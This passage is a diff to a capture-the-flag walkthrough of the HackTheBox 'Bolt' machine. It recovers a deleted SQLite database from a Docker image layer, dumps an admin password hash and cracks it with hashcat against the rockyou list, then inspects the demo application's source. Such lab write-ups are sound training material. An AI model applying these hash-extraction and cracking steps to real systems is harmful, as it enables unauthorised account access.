@@ -256,7 +256,123 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 ├── manifest.json
 └── repositories
 ```
+- We can use [dive](https://github.com/wagoodman/dive) to analyze the image
+
+![](./images/8.png)
+
+- We have a `db.sqlite3` which is removed in latest layers
+
+![](./images/9.png)
+
+![](./images/10.png)
+
+- Let's grab the layer `id` and check the content of the `layer.tar`
+  - `a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2`
+```
+┌──(kali㉿kali)-[~/bolt/image/a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2]
+└─$ tar tf layer.tar 
+db.sqlite3
+root/
+root/.ash_history
+tmp/
+```
+
+- Let's check the content
+```
+└─$ sqlite3 db.sqlite3 
+SQLite version 3.42.0 2023-05-16 12:36:15
+Enter ".help" for usage hints.
+sqlite> .table
+User
+sqlite> .schema User
+CREATE TABLE IF NOT EXISTS "User" (
+        id INTEGER NOT NULL, 
+        username VARCHAR, 
+        email VARCHAR, 
+        password BLOB, 
+        email_confirmed BOOLEAN, 
+        profile_update VARCHAR(80), 
+        PRIMARY KEY (id), 
+        UNIQUE (username), 
+        UNIQUE (email)
+);
+sqlite> select * from User;
+1|admin|admin@bolt.htb|$1$sm1RceCh$rSd3PygnS/6jlFDfF2J5q.||
+sqlite> 
+```
+
+- Let's try to crack
+```
+└─$ hashcat -m 500 hash /usr/share/wordlists/rockyou.txt  
+hashcat (v6.2.6) starting
+
+OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+==================================================================================================================================================
+* Device #1: pthread-sandybridge-12th Gen Intel(R) Core(TM) i5-12400, 1436/2936 MB (512 MB allocatable), 2MCU
+...
+$1$sm1RceCh$rSd3PygnS/6jlFDfF2J5q.:deadbolt               
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 500 (md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5))
+Hash.Target......: $1$sm1RceCh$rSd3PygnS/6jlFDfF2J5q.
+Time.Started.....: Mon Sep 25 17:25:28 2023 (12 secs)
+Time.Estimated...: Mon Sep 25 17:25:40 2023 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:    13944 H/s (8.85ms) @ Accel:64 Loops:1000 Thr:1 Vec:8
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 172800/14344385 (1.20%)
+Rejected.........: 0/172800 (0.00%)
+Restore.Point....: 172672/14344385 (1.20%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1000
+Candidate.Engine.: Device Generator
+Candidates.#1....: derek25 -> danniela
+Hardware.Mon.#1..: Util: 98%
+
+Started: Mon Sep 25 17:25:27 2023
+Stopped: Mon Sep 25 17:25:42 2023
+
+```
+
+- The creds only work for `http://bolt.htb/login`
+  - But nothing interesting
+
+![](./images/11.png)
+
+- We also have `demo.bolt.htb`
+  - Let's check the source code
+  - Layer 3 according to `dive`
+
+```
+┌──(kali㉿kali)-[~/bolt/image/41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/app]
+└─$ tree -L 2        
+.
+├── base
+│   ├── forms.py
+│   ├── __init__.py
+│   ├── models.py
+│   ├── __pycache__
+│   ├── routes.py
+│   ├── static
+│   ├── templates
+│   └── util.py
+├── home
+│   ├── forms.py
+│   ├── __init__.py
+│   ├── __pycache__
+│   ├── routes.py
+│   └── templates
+├── __init__.py
+└── __pycache__
+    └── __init__.cpython-39.pyc
+
+9 directories, 10 files
+```
 ## User
+
+
 
 
 ## Root
